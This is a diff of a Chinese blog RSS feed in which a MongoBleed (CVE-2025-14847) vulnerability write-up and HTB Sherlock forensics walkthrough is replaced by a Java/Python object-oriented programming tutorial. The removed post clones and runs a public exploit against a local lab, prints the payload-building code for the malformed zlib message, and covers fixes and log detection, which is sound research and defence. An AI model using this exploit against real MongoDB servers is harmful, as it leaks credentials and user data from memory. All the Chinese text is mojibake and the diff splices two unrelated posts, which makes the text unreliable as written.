@@ -3,400 +3,194 @@
     <channel>
         <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
         <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
-        <lastBuildDate>2026-01-03T08:21:57.069Z</lastBuildDate>
+        <lastBuildDate>2026-01-03T12:30:23.487Z</lastBuildDate>
         <description><![CDATA[
         ä¸»é¡µ - åå®¢å­ RSS
     ]]></description>
         <language>zh-cn</language>
         <item>
-    <title><![CDATA[ æ·±åº¦åæMangoBleed(CVE-2025-14847) ]]></title>
-    <link>https://www.cnblogs.com/DSchenzi/p/19434377</link>
-    <guid>cf48ed95b39651f1399a333f31e72f3f</guid>
+    <title><![CDATA[ é¢åå¯¹è±¡ä¸å¤§ç¹ç¹(å°è£ãç»§æ¿ãå¤æ) ]]></title>
+    <link>https://www.cnblogs.com/xi-yongqi/p/19434736</link>
+    <guid>7012d0690ba12857f60e9a5aba839454</guid>
     <description>
     <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/DSchenzi/p/19434377" title="åå¸äº 2026-01-03 15:22">
-    <span role="heading" aria-level="2">æ·±åº¦åæMangoBleed(CVE-2025-14847)</span>
+		<h1 class="postTitle">
+			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xi-yongqi/p/19434736" title="åå¸äº 2026-01-03 19:08">
+    <span role="heading" aria-level="2">é¢åå¯¹è±¡ä¸å¤§ç¹ç¹(å°è£ãç»§æ¿ãå¤æ)</span>
     
 
 </a>
 
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<h1 id="mangobleedcve-2025-14847">MangoBleed(CVE-2025-14847)</h1>
-<p>æ¬æåæäºCVE-2025-14847æ¼æ´åçãæ¼æ´å¤ç°ä»¥åç»åäºHTBé¶åºçSherlockè¿è¡ç»¼ååææ¥å¿ã</p>
-<h2 id="sherlock-scenario">Sherlock Scenario</h2>
-<p>You were contacted early this morning to handle a highâpriority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.</p>
-<p>You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.</p>
-<h2 id="task1">Task1</h2>
-<p>What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?</p>
-<p>ç½ä¸æä¸ä¸ä¹å°±æ¯æè¿çåºæ¥ç</p>
-<p><strong>CVE-2025-14847</strong></p>
-<h3 id="æ¼æ´ç®ä»">æ¼æ´ç®ä»</h3>
-<ul>
-<li>
-<p>ç±»åï¼æ è®¤è¯è¿ç¨å åå­æ³é²</p>
-</li>
-<li>
-<p>å±å®³ï¼æ»å»èæ éè®¤è¯å³å¯ä»æå¡å¨åå­ä¸­æåæææ°æ®ï¼å¯è½åæ¬æ°æ®åºå­è¯ãAPIå¯é¥ãä¼è¯ä»¤çãç¨æ·æ°æ®ç­</p>
-</li>
-</ul>
-<h3 id="æ¼æ´åç">æ¼æ´åç</h3>
-<p>æ ¹æºå¨äºMongoDBçzlibç½ç»æ¶æ¯åç¼©å¤çé»è¾ï¼</p>
-<ul>
-<li>MongoDBæ¯æå®¢æ·ç«¯åéåç¼©æ¶æ¯ã</li>
-<li>æ»å»èåéç¹è´¨ç¸å½¢çåç¼©åï¼å¨æ¶æ¯å¤´ä¸­ææå¶é é¿åº¦å­æ®µä¸ä¸è´</li>
-<li>æå¡å¨å¨è§£åæ¶ä¼åéè¿å¤§ç¼å²åºï¼å¹¶éè¯¯å°å°æªåå§åå°å åå­ä½ä¸ºæææ°æ®è¿åç»æ»å»èã</li>
-<li>æ­¤è¿ç¨å¤æ¬¡åéä¸ååç§»çç¸å½¢è¯·æ±ï¼æ»å»èå¯éæ­¥æååå­ç¢çï¼èååå¯è½æ¢å¤ææä¿¡æ¯ã</li>
-<li>ä¸æ¯ç´æ¥RCEï¼ä½æ³é²çå­è¯å¯å¯¼è´åç»­æ¨ªåç§»å¨ææ°æ®çªåã</li>
-</ul>
-<h3 id="åå½±åçæ¬">åå½±åçæ¬</h3>
-<p>å ä¹ææ2017å¹´ä»¥æ¥å¯ç¨zlibåç¼©çMongoDB Serverçæ¬ï¼åæ¬ä¸»æµåæ¯:</p>
-<ul>
-<li>8.xç³»åï¼è³8.2.2ï¼</li>
-<li>7.0.xã6.0.xã5.0.xã4.4.xç­éççæ¬</li>
-<li>å·ä½ï¼å½±å4.4ã5.0ã6.0ã7.0ã8.0å¨ç³»åï¼ç´å°2025å¹´11æçæ¬ï¼</li>
-</ul>
-<h3 id="ç¯å¢æ­å»º">ç¯å¢æ­å»º</h3>
-<p>1.dockerç¯å¢</p>
-<p>docker-compose.yml</p>
-<pre><code class="language-yml">version: '3.8'
-
-services:
-  # åæ¼æ´å½±åççæ¬ï¼å¼å¯ Zlibï¼
-  mongodb-vulnerable:
-    image: mongo:6.0.14
-    container_name: mongodb-vulnerable
-    ports:
-      - "27017:27017"
-    command: mongod --networkMessageCompressors snappy,zlib
-
-  # å·²ä¿®å¤ççæ¬ï¼ç¨äºå¯¹æ¯æµè¯ï¼
-  mongodb-patched:
-    image: mongo:6.0.27
-    container_name: mongodb-patched
-    ports:
-      - "27018:27017"
-    command: mongod --networkMessageCompressors snappy,zlib
-
-volumes:
-  mongodb-data:
-  mongodb-patched-data:
-</code></pre>
-<p>æåéå</p>
-<pre><code class="language-kotlin">docker-compose up -d
-</code></pre>
-<p>æåå¤±è´¥çå¯ä»¥ä½¿ç¨è¿ä¸ªä»åºçéåæºéç½®å·¥å·:</p>
-<pre><code class="language-kotlin">git clone https://github.com/hzhsec/docker_proxy.git
-chmod +x *.sh
-./docker-proxy.sh
-</code></pre>
-<p>ç­éåæºæ¢å®ï¼åæå</p>
-<pre><code>docker-compose up -d
-</code></pre>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152112091-633231826.png" alt="image-20260101223837974" loading="lazy"></p>
-<h3 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h3>
-<pre><code class="language-kotlin">git clone https://github.com/cybertechajju/CVE-2025-14847_Expolit.git
-cd CVE-2025-14847_Expolit
-</code></pre>
-<p>åå»ºèæç¯å¢</p>
-<pre><code class="language-kotlin">python -m venv myenv
-source myenv/bin/activate
-</code></pre>
-<p>å®è£ä¾èµå</p>
-<pre><code class="language-kotlin">pip install -r requirements.txt
-python mongobleed_pro.py -h
-</code></pre>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152112673-1527423820.png" alt="image-20260101225522114" loading="lazy"></p>
-<p>ä½¿ç¨æ¬å°ç27017æ¼æ´çæ¬æµè¯</p>
-<pre><code>python mongobleed_pro.py --target http://localhost:27017
-</code></pre>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113009-2057906935.png" alt="image-20260101230632647" loading="lazy"></p>
-<p>æ³é²äºæ°æ®ï¼ä¿å­å¨æ¬å°ç<code>dump_localhost.bin</code>ï¼<code>loot_localhost.txt</code></p>
-<p>åæ¶æµè¯ä¸ä¸<code>27018</code>ç«¯å£</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113400-1983221027.png" alt="image-20260101230957937" loading="lazy"></p>
-<p>æ²¡ææ¼æ´</p>
-<h3 id="æ¼æ´åæ">æ¼æ´åæ</h3>
-<p>æä»¬ä»expä¸å»åæä¸ä¸</p>
-<p>ç¬¬ä¸æ­¥ï¼</p>
-<pre><code class="language-python">sock = socket.socket()
-sock.settimeout(3)
-sock.connect((host, port))  # å°è¯è¿æ¥MongoDBé»è®¤ç«¯å£27017
-</code></pre>
-<p>ç¬¬äºæ­¥ï¼</p>
-<p><code>check_vulnerability()</code>æ¼æ´å­å¨æ§æ£æµ</p>
-<pre><code class="language-python">def check_vulnerability(host, port):
-    hacker_loading("Probing target defenses", 1)
-    test_offsets = [100, 500, 1000, 1500, 2000, 3000]
-    for offset in test_offsets:
-        response = send_probe(host, port, offset, offset + 500)
-        if extract_leaks(response):
-            return True
-    return False
-</code></pre>
-<p>éè¿ä¸åç"åç§»éï¼offsetï¼"åéè¯·æ±ï¼åªè¦è½ä»ååºä¸­æåå°éé¢ææ°æ®ï¼å°±å¤å®ç®æ æ¼æ´æªä¿®å¤ã</p>
-<p>ç¬¬ä¸æ­¥ï¼</p>
-<p><code>send_probe()</code>æé payload</p>
-<pre><code class="language-python"># 1. æé ç¸å½¢çBSONææ¡£ï¼MongoDBçæ°æ®æ ¼å¼ï¼
-content = b'\x10a\x00\x01\x00\x00\x00'
-bson = struct.pack('&lt;i', doc_len) + content  # ä¼ªé ææ¡£é¿åº¦ï¼å³é®æ¼æ´è§¦åç¹ï¼
-
-# 2. å°è£ä¸ºMongoDBçOP_MSGæ¶æ¯
-op_msg = struct.pack('&lt;I', 0) + b'\x00' + bson
-
-# 3. åç¼©æ¶æ¯ï¼è§¦åæ¼æ´çå³é®æä½ï¼
-compressed = zlib.compress(op_msg)
-
-# 4. æé æç»æ¶æè½½è·ï¼åå«åç¼©æ è¯+ç¸å½¢æ°æ®ï¼
-payload = struct.pack('&lt;I', 2013) + struct.pack('&lt;i', buffer_size) + struct.pack('B', 2) + compressed
-
-# 5. å ä¸MongoDBåè®®å¤´ï¼åéç»ç®æ 
-header = struct.pack('&lt;IIII', 16 + len(payload), 1, 0, 2012)
-sock.sendall(header + payload)
-</code></pre>
+		</h1>
+		<div class="clear"></div>
+		<div class="postBody">
+			<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<p><strong>é¢åå¯¹è±¡ç¼ç¨æä¸å¤§ç¹æ§ï¼å°è£ãç»§æ¿ãå¤æã</strong></p>
+<h4 id="å°è£">å°è£</h4>
 <ol>
-<li>ä¼ªé çBSONææ¡£é¿åº¦(doc_len)ä¸å®éåå®¹ä¸å¹é</li>
-<li>å¯¹è¯·æ±è¿è¡zlibåç¼©åï¼MongoDBçè§£å/è§£æé»è¾å­å¨ç¼ºé·ï¼å¯¼è´åå­è¶çè¯»å</li>
-<li>æ»å»èéè¿æ§å¶doc_lenåbuffer_sizeï¼ç¼å²åºå¤§å°ï¼ï¼ç²¾åæ§å¶åå­è¯»åçèå´</li>
+<li>å°è£æ¯æå°å¯¹è±¡çå±æ§ï¼æ°æ®ï¼å¦åéï¼åè¡ä¸ºï¼æä½æ°æ®çæ¹æ³ï¼å¦å½æ°ï¼æç»å¨ä¸èµ·ï¼åæ¶éèå¯¹è±¡åé¨çå®ç°ç»èã</li>
+<li>æ ¸å¿ç®ç</li>
 </ol>
-<p>ç¬¬åæ­¥ï¼</p>
-<p>åéè¯·æ±å¹¶æ¥æ¶æ³é²æ°æ®ï¼send_probe()åç»­é»è¾ï¼</p>
-<pre><code class="language-python">response = b''
-while len(response) &lt; 4 or len(response) &lt; struct.unpack('&lt;I', response[:4])[0]:
-    chunk = sock.recv(4096) #æç»­æ¥åååºï¼ç´å°å®æ´è¯»åï¼
-    if not chunk: break
-    response += chunk
+<ul>
+<li>æé«ä»£ç å®å¨æ§ï¼é²æ­¢å¤é¨ç¨åºéæç¯¡æ¹å¯¹è±¡çåé¨å±æ§ï¼é¿åæ ææ°æ®çäº§çã</li>
+<li>æåä»£ç å¯ç»´æ¤æ§ï¼åé¨å®ç°ç»èçä¿®æ¹ä¸ä¼å½±åå¤é¨è°ç¨èï¼éä½ä»£ç è¦ååº¦ã</li>
+<li>å¢å¼ºä»£ç å¤ç¨æ§ï¼å°è£åçç±»å¯ä»¥ä½ä¸ºç¬ç«æ¨¡åè¢«å¤æ¬¡å¼ç¨ã</li>
+</ul>
+<ol start="3">
+<li>å·ä½å®ç°ï¼</li>
+</ol>
+<ul>
+<li>ä½¿ç¨ private ä¿®é¥°æååé</li>
+<li>æä¾ publicçgetter/setteræ¹æ³</li>
+</ul>
+<pre><code class="language-java">public class User {
+    private String name;
+
+    public String getName() {
+        return name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+}
+
 </code></pre>
-<p>è·åç®æ è¿åçãåå«åå­æ³æ¼æ°æ®çååºå</p>
-<p>ç¬¬äºæ­¥ï¼</p>
-<p>æåæ³é²çåå­æ°æ®å³ extract_leakså½æ°</p>
-<p>æ¹éæå+ææä¿¡æ¯è¯å«<code>run_exploit()</code> + <code>analyze_secrets()</code></p>
-<p>è¿æä¿å­æ»å»ç»æï¼æä¹ålootï¼</p>
-<p>æ»å»æ»ç»ï¼</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113901-643757865.png" alt="image-20260102153604895" loading="lazy"></p>
-<p>åå°æºç </p>
-<p><a href="https://github.com/mongodb/mongo/blob/r8.0.16/src/mongo/transport/message_compressor_zlib.cpp" target="_blank" rel="noopener nofollow">https://github.com/mongodb/mongo/blob/r8.0.16/src/mongo/transport/message_compressor_zlib.cpp</a></p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152114375-627847864.png" alt="image-20260102154747986" loading="lazy"></p>
-<p>åæ¬ç¨äºè¿åè§£åæ°æ®å¤§å°çè¡ä½¿ç¨äº<code>return {output.length()};</code>è¿è¡ä»£ç ï¼å®åè¯ä»£ç è¿åå·²åéçåå­éï¼èä¸æ¯è§£åæ°æ®çå®éé¿åº¦ãæ°ç<code>return {length};</code>ç¡®ä¿åªè¿åè§£åç¼©æ°æ®çå®éé¿åº¦ã</p>
-<p><a href="https://github.com/mongodb/mongo/blob/master/src/mongo/transport/message_compressor_zlib.cpp" target="_blank" rel="noopener nofollow">https://github.com/mongodb/mongo/blob/master/src/mongo/transport/message_compressor_zlib.cpp</a></p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152114721-1137957807.png" alt="image-20260102155010199" loading="lazy"></p>
-<p>è¿ä¸æ­¥åæå¯ä»¥åç°ï¼å¨æ°ç<code>src/mongo/transport/message_compressor_manager_test.cpp</code>ä¸­å¤äºä¸ä¸ªcheckUndersizeå½æ°</p>
-<pre><code class="language-cpp">void checkUndersize(const Message&amp; compressedMsg,
-                    std::unique_ptr&lt;MessageCompressorBase&gt; compressor) {
-    MessageCompressorRegistry registry;
-    const auto compressorName = compressor-&gt;getName();
+<hr>
+<h4 id="ç»§æ¿">ç»§æ¿</h4>
+<ol>
+<li>ç»§æ¿ï¼å­ç±»(æ´¾çç±»)ç»§æ¿ç¶ç±»(åºç±»/è¶ç±»)çå±æ§åæ¹æ³ï¼å®ç°ä»£ç å¤ç¨ï¼å¹¶å»ºç« is-a å³ç³»ãå­ç±»æ ééæ°ç¼åç¶ç±»çå·²æä»£ç ï¼åæ¶è¿è½æ ¹æ®éæ±æ©å±èªèº«çç¬æå±æ§åæ¹æ³ï¼çè³éåç¶ç±»çæ¹æ³ã</li>
+<li>æ ¸å¿ç®ç</li>
+</ol>
+<ul>
+<li>æå¤§åä»£ç å¤ç¨ï¼åå°åä½ä»£ç ï¼æé«å¼åæçã</li>
+<li>å»ºç«ç±»çå±æ¬¡å³ç³»ï¼æ¸æ°æ¢³çç±»ä¸ç±»ä¹é´çé»è¾å³èï¼å¦âå­¦çâæ¯âäººâçä¸ç§ï¼ã</li>
+<li>ä¸ºå¤ææä¾åºç¡æ¯æã</li>
+</ul>
+<ol start="3">
+<li>å·ä½å®ç°</li>
+</ol>
+<pre><code class="language-java">class Animal {
+    void eat() {}
+}
 
-    std::vector&lt;std::string&gt; compressorList = {compressorName};
-    registry.setSupportedCompressors(std::move(compressorList));
-    registry.registerImplementation(std::move(compressor));
-    registry.finalizeSupportedCompressors().transitional_ignore();
-
-    MessageCompressorManager mgr(&amp;registry);
-    BSONObjBuilder negotiatorOut;
-    std::vector&lt;StringData&gt; negotiator({compressorName});
-    mgr.serverNegotiate(negotiator, &amp;negotiatorOut);
-    checkNegotiationResult(negotiatorOut.done(), {compressorName});
-
-    auto swm = mgr.decompressMessage(compressedMsg);
-    ASSERT_EQ(ErrorCodes::BadValue, swm.getStatus());
+class Dog extends Animal {
+    void bark() {}
 }
 </code></pre>
-<p>æ ¸å¿é»è¾å¨</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115003-534946274.png" alt="image-20260102155616512" loading="lazy"></p>
-<p><code>mgr.decompressMessage(compressedMsg)</code>:è°ç¨åç¼©å¨ç®¡çå¨è§£åä¼ å¥çâå¼å¸¸âçåç¼©æ¶æ¯</p>
-<p><code>ASSERT_EQ(ErrorCodes::BadValue, swm.getStatus())</code>ï¼ååæµè¯æ­è¨</p>
-<p>ä¸»è¦ç®çæ¯éªè¯å½ä¼ å¥ä¸ä¸ª âå°ºå¯¸å¼å¸¸ï¼undersizeï¼â çåç¼©æ¶æ¯æ¶ï¼æ¶æ¯è§£åé»è¾è½æ­£ç¡®è¿å <code>ErrorCodes::BadValue</code> éè¯¯ç </p>
-<p>åæ¶å¨ä¸é¢ä¹ç»å°äºæµè¯ç¨ä¾</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115354-1662843965.png" alt="image-20260102155917477" loading="lazy"></p>
-<p>éç¹çä¸ä¸Zlibçæµè¯ç¨ä¾</p>
-<pre><code class="language-cpp">TEST(ZlibMessageCompressor, Undersize) {
-    // 1. æé Zlibç®æ³çâå°ºå¯¸å¼å¸¸âäºè¿å¶æ¶æ¯æ°æ®
-    std::vector&lt;std::uint8_t&gt; payload = {
-        0x3c, 0x00, 0x00, 0x00, 0xad, 0xde, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdc, 0x07, 0x00,
-        0x00, 0xdd, 0x07, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x02, 0x78, 0xda, 0x63, 0x60, 0x00,
-        0x82, 0xdf, 0xf2, 0x0c, 0x0c, 0xac, 0xf1, 0x99, 0x29, 0x0c, 0x0c, 0x02, 0x40, 0x9e, 0x87,
-        0xab, 0x63, 0x80, 0x8f, 0xab, 0xa3, 0x37, 0x03, 0x12, 0x00, 0x00, 0x6d, 0x26, 0x04, 0x97};
+<ol start="4">
+<li>æ³¨æäºé¡¹ï¼</li>
+</ol>
+<ul>
+<li>Javaåªæ¯æåç»§æ¿ï¼Pythonæ¯æå¤ç»§æ¿ã</li>
+<li>å¯ä»¥å¤å±ç»§æ¿</li>
+<li>å¯ä»¥å®ç°å¤ä¸ªæ¥å£</li>
+</ul>
+<hr>
+<h4 id="å¤æ">å¤æ</h4>
+<ol>
+<li>å¤æï¼åä¸ä¸ªæ¹æ³è°ç¨ï¼å¨ä¸åå¯¹è±¡ä¸è¡¨ç°åºä¸åçè¡ä¸ºã</li>
+<li>å¤æåæ(javaä¸­)</li>
+</ol>
+<ul>
+<li>æç»§æ¿ææ¥å£å³ç³»</li>
+<li>æ¹æ³éå</li>
+<li>ç¶ç±»å¼ç¨æåå­ç±»å¯¹è±¡</li>
+</ul>
+<ol start="3">
+<li>ç®çï¼</li>
+</ol>
+<ul>
+<li>æé«ä»£ç çµæ´»æ§ï¼éä½ä»£ç è¦ååº¦</li>
+<li>å¢å¼ºä»£ç å¯æ©å±æ§ï¼å®ç¾å¥å âå¼é­ååâ</li>
+<li>ç®åä»£ç ç»æï¼æé«ä»£ç å¯ç»´æ¤æ§</li>
+</ul>
+<ol start="4">
+<li>ä»£ç ç¤ºä¾ï¼</li>
+</ol>
+<pre><code class="language-java">// 1. å­å¨ç»§æ¿å³ç³»ï¼ç¶ç±»Personï¼
+class Person {
+    // ç¶ç±»æ¹æ³ï¼éprivateãéstaticãéfinalï¼å¯è¢«éåï¼
+    public void work() {
+        System.out.println("æ®éäººçå·¥ä½");
+    }
+}
 
-    // 2. åéç¼å²åºå¹¶æ·è´æ°æ®
-    auto buffer = SharedBuffer::allocate(payload.size());
-    std::copy(payload.begin(), payload.end(), buffer.get());
+// å­ç±»Studentï¼ç»§æ¿Person
+class Student extends Person {
+    // 2. æ¹æ³éåï¼ä¸¥æ ¼éµå¾ªæ¹æ³ç­¾åä¸è´ï¼
+    @Override
+    public void work() {
+        System.out.println("å­¦ççå·¥ä½ï¼ä¸è¯¾å­¦ä¹ ");
+    }
+}
 
-    // 3. è°ç¨æµè¯å½æ°ï¼ä¼ å¥å¼å¸¸æ¶æ¯ + Zlibåç¼©å¨å®ä¾
-    checkUndersize(Message(buffer), std::make_unique&lt;ZlibMessageCompressor&gt;());
+// å­ç±»Teacherï¼ç»§æ¿Person
+class Teacher extends Person {
+    // 2. æ¹æ³éå
+    @Override
+    public void work() {
+        System.out.println("èå¸çå·¥ä½ï¼å¤è¯¾æè¯¾");
+    }
+}
+
+public class PolymorphismTest {
+    public static void main(String[] args) {
+        // 3. ç¶ç±»å¼ç¨æåå­ç±»å¯¹è±¡ï¼æ ¸å¿æ¡ä»¶ï¼
+        Person p1 = new Student();
+        Person p2 = new Teacher();
+        
+        // è§¦åå¤æï¼è°ç¨åä¸æ¹æ³ï¼åç°ä¸åè¡ä¸º
+        p1.work(); // è¾åºï¼å­¦ççå·¥ä½ï¼ä¸è¯¾å­¦ä¹ 
+        p2.work(); // è¾åºï¼èå¸çå·¥ä½ï¼å¤è¯¾æè¯¾
+    }
 }
 </code></pre>
+<ol start="5">
+<li>javaä¸pythonå¤æåææ¡ä»¶çåºå«</li>
+</ol>
+<p><strong>äºèçå·®å¼æ ¹æºæ¯ Java ä¸ºéæå¼ºç±»åè¯­è¨ï¼çº¦æä¸¥æ ¼ï¼ï¼Python ä¸ºå¨æå¼±ç±»åè¯­è¨ï¼çº¦æå®½æ¾ï¼çµæ´»åº¦æ´é«ï¼ï¼å·ä½åææ¡ä»¶å¯¹æ¯å¦ä¸ï¼</strong></p>
 <table>
 <thead>
 <tr>
-<th>å­èèå´</th>
-<th>å«ä¹</th>
-<th>å¯¹åº payload å¼</th>
-<th>è¯´æ</th>
+<th>å¯¹æ¯ç»´åº¦</th>
+<th>Java å¤æï¼å¿èï¼ç¼ºä¸ä¸å¯ï¼</th>
+<th>Python å¤æï¼æ å¼ºå¶çº¦æï¼çµæ´»å®½æ¾ï¼</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>0-3</td>
-<td>æ¶æ¯æ»é¿åº¦ï¼å°ç«¯åº uint32ï¼</td>
-<td>0x3c 0x00 0x00 0x00</td>
-<td>è§£æä¸ºåè¿å¶ 60 â å£°ææ¶æ¯æ»é¿åº¦æ¯ 60 å­è</td>
+<td>ç»§æ¿/æ¥å£ä¾èµ</td>
+<td>å¿é¡»å·å¤ç±»ç»§æ¿å³ç³»ææ¥å£å®ç°å³ç³»ï¼æ æ­¤å³ç³»æ æ³å®ç°å¤æ</td>
+<td>æ éå¼ºå¶ä¾èµï¼â  æ¯æç»§æ¿ï¼å / å¤ç»§æ¿ï¼å®ç°å¤æï¼ä¸ Java ç±»ä¼¼ï¼ï¼â¡ æ ¸å¿æ¯æ<a href="https://www.cnblogs.com/xi-yongqi/p/19167194" target="_blank">é¸­å­ç±»å</a>ï¼æ ä»»ä½ç»§æ¿ / æ¥å£ï¼åªè¦å¯¹è±¡æ¥æç®æ æ¹æ³å³å¯å®ç°å¤æ</td>
 </tr>
 <tr>
-<td>4-7</td>
-<td>é­æ° / æ è¯</td>
-<td>0xad 0xde 0x00 0x00</td>
-<td>MongoDB èªå®ä¹çåç¼©æ¶æ¯æ è¯ï¼0xADDE æ¯åºå®å¼ï¼</td>
+<td>æ¹æ³éåè¦æ±</td>
+<td>ä¸¥æ ¼éµå¾ªè§åï¼æ¹æ³åãåæ°åè¡¨ãè¿åå¼å¿é¡»ä¸è´ï¼ç¶ç±»æ¹æ³ä¸è½æ¯private/static/finalï¼æ¨èæ¾å¼æ æ³¨@Override</td>
+<td>æ ä¸¥æ ¼è§åï¼ä»éå­ç±»ä¸ç¶ç±»æ¹æ³ååå³å¯è§ä¸º âéåâï¼å¯çµæ´»ä¿®æ¹åæ° / è¿åå¼ï¼æ å¼ºå¶@Overrideæ æ³¨</td>
 </tr>
 <tr>
-<td>8-11</td>
-<td>ä¿çå­æ®µ</td>
-<td>0x00 0x00 0x00 0x00</td>
-<td>æ å®éæä¹ï¼å ä½</td>
-</tr>
-<tr>
-<td>12-15</td>
-<td>åç¼©å¨ç±»åï¼å°ç«¯åº uint32ï¼</td>
-<td>0xdc 0x07 0x00 0x00</td>
-<td>è§£æä¸ºåè¿å¶ 2012 â æ è¯è¿æ¯ Zlib åç¼©çæ°æ®ï¼ä¸ååç¼©å¨æä¸å±æ°å¼ï¼</td>
-</tr>
-<tr>
-<td>16-19</td>
-<td>ä¿çå­æ®µ</td>
-<td>0xdd 0x07 0x00 0x00</td>
-<td>å ä½</td>
-</tr>
-<tr>
-<td>20-23</td>
-<td>åå§æ°æ®é¿åº¦ï¼å°ç«¯åº uint32ï¼</td>
-<td>0x00 0x20 0x00 0x00</td>
-<td>è§£æä¸ºåè¿å¶ 8192 â å£°æè§£åååå§æ°æ®é¿åº¦æ¯ 8192 å­è</td>
-</tr>
-<tr>
-<td>24</td>
-<td>åç¼©ç®æ³æ è¯</td>
-<td>0x02</td>
-<td>Zlib çç®æ³æ è¯ï¼Snappy æ¯ 0x01ï¼Zstd æ¯ 0x03ï¼</td>
-</tr>
-<tr>
-<td>25+</td>
-<td>Zlib åç¼©æ°æ®ä½</td>
-<td>0x78 0xda ... 0x04 0x97</td>
-<td>Zlib æ ¼å¼çåç¼©æ°æ®ï¼ä½è¢«æææé ä¸º âå°ºå¯¸ä¸è¶³âï¼</td>
+<td>å¯¹è±¡å¼ç¨ç»å®</td>
+<td>å¿é¡»æ»¡è¶³ç¶ç±»/æ¥å£å¼ç¨æåå­ç±»/å®ç°ç±»å¯¹è±¡ï¼éæç±»åå£°æä¸ºç¶ç±»ï¼å®éæåå­ç±»å®ä¾ï¼ï¼è¿æ¯è§¦åå¤æçå³é®</td>
+<td>å®å¨ä¸éè¦ï¼Pythonåéæ åºå®ç±»åå£°æï¼æ éå»æç»å®ç¶ç±»å¼ç¨ï¼ç´æ¥ä½¿ç¨å­ç±»å®ä¾æç¬¦åæ¹æ³è¦æ±çå¯¹è±¡å³å¯è§¦åå¤æ</td>
 </tr>
 </tbody>
 </table>
-<ul>
-<li>å¤´é¨å£°æ âåå§æ°æ®é¿åº¦æ¯ 8192 å­èâï¼ä½å®éç Zlib åç¼©æ°æ®ä½åªæ <code>60-25=35</code> å­è â è¿ä¸è¶³ä»¥è§£ååº 8192 å­èçåå§æ°æ®ï¼è§£åé»è¾ä¼æ£æµå° âæ°æ®å°ºå¯¸ä¸è¶³âã</li>
-</ul>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115814-318572431.png" alt="image-20260102160356664" loading="lazy"></p>
-<h3 id="æ¼æ´ä¿®å¤">æ¼æ´ä¿®å¤</h3>
-<p>1.ç«å³åçº§å°<strong>å·²ä¿®å¤çæ¬</strong>ï¼</p>
-<p>ç«å³åçº§å°ï¼</p>
-<ul>
-<li>8.2.3ã8.0.17ã7.0.28ã6.0.27ã5.0.32ã4.4.30</li>
-<li>MongoDB Atlasï¼æç®¡çï¼å·²èªå¨ä¿®å¤ã</li>
-</ul>
-<p>2.<strong>ä¸´æ¶ç¼è§£</strong>ï¼<br>
-ç¦ç¨ <code>zlib</code> åç¼©<br>
-ï¼å¯å¨åæ°ï¼<code>--networkMessageCompressors=snappy,zstd</code> æéç½®æä»¶ä¸­æé¤ zlibï¼<br>
-ä¸è¦å°27017ç«¯å£æ´é²å¨äºèç½<br>
-æ°æ®åºè®¿é®è®¾ç½®ç½åå,ä¸è¦è®¾ç½®ä»»ä½ipå¯è®¿é®</p>
-<h2 id="task2">Task2</h2>
-<p>What is the version of MongoDB installed on the server that the CVE exploited?</p>
-<p>åæä½äº<code>MangoBleed\uac-mongodbsync-linux-triage\[root]\var\log\mongodb\mongod.log</code></p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116177-1760271411.png" alt="image-20260102161150999" loading="lazy"></p>
-<p>8.0.16</p>
-<h2 id="task3">Task3</h2>
-<p>Analyze the MongoDB logs to identify the attackerâs remote IP address used to exploit the CVE.</p>
-<p>å¨æ¥å¿ä¸­å³æ³¨äºä»¶ID22943(è¿æ¥)åID22944(æ­å¼è¿æ¥)</p>
-<p>65.0.76.43</p>
-<p>æä»¬ä¹å¯ä»¥ç¨å·¥å·è¿è¡åæ</p>
-<p><a href="https://github.com/Neo23x0/mongobleed-detector" target="_blank" rel="noopener nofollow">https://github.com/Neo23x0/mongobleed-detector</a></p>
-<pre><code class="language-kotlin"># Shell script dependencies
-# Debian/Ubuntu
-apt-get install jq gawk gzip
-
-# RHEL/CentOS/Fedora
-dnf install jq gawk gzip
-
-# macOS
-brew install jq gawk
-
-# Python remote scanner has no additional dependencies
-# Uses native ssh/scp commands
-
-
-# Clone the repository
-git clone https://github.com/your-org/mongobleed-detector.git
-cd mongobleed-detector
-
-# Make executable
-chmod +x mongobleed-detector.sh
-</code></pre>
-<pre><code class="language-kotlin">./mongobleed-detector.sh --no-default-paths -p ./mongod.log -t 10000
-</code></pre>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116518-329116859.png" alt="image-20260102164314888" loading="lazy"></p>
-<h2 id="task4">Task4</h2>
-<p>Based on the MongoDB logs, determine the exact date and time the attackerâs exploitation activity began (the earliest confirmed malicious event)</p>
